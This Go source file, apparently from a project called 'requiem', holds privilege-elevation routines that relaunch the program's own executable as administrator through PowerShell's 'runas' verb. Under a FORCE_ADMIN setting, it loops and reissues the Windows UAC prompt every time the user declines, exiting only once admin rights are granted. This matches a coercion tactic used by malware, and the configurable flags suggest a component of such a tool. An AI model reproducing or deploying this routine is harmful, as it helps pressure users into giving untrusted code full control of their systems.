package funcs

import (
	"fmt"
	"os"

	"requiem/store"
	"requiem/utils"
)

func AttempElevate() bool {
	command := fmt.Sprintf("start \"%s\" -verb runas", store.ExecPath)

	err := utils.RunCommand("powershell", "-c", command)
	if err != nil {
		return false
	}

	return true
}

func ElevateWithConfig() {
	command := fmt.Sprintf("start \"%s\" -verb runas", store.ExecPath)

	if store.FORCE_ADMIN {
		for {
			err := utils.RunCommand("powershell", "-c", command)
			if err != nil {
				continue
			}

			os.Exit(0)
		}
	}

	if store.PROMPT_ADMIN {
		err := utils.RunCommand("powershell", "-c", command)
		if err != nil && !store.CONTINUE_WITHOUT_ADMIN {
			os.Exit(0)
		}
	}
}
